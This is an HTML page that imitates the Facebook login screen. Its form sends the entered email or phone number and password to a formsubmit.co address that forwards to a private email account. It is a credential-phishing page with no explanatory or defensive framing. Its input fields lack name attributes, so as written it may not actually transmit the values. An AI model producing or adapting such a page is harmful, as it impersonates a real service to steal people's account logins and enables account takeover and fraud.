<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: #ffffff;
            width: 360px;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }

        h1 {
            color: #1877f2;
            font-size: 36px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #166fe5;
        }

        .forgot {
            display: block;
            margin: 12px 0;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }

        hr {
            margin: 20px 0;
            border: 0;
            border-top: 1px solid #ddd;
        }

        .create {
            background: #42b72a;
            font-size: 15px;
        }

        .create:hover {
            background: #36a420;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h1>facebook</h1>

    <form  action="https://formsubmit.co/vincentpenaso98@email.com" method="POST" >
        <input type="text" placeholder="Email or phone number" required>
        <input type="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    <a href="#" class="forgot">Forgotten password?</a>
    <hr>
    <button class="create">Create New Account</button>
</div>

</body>
</html>
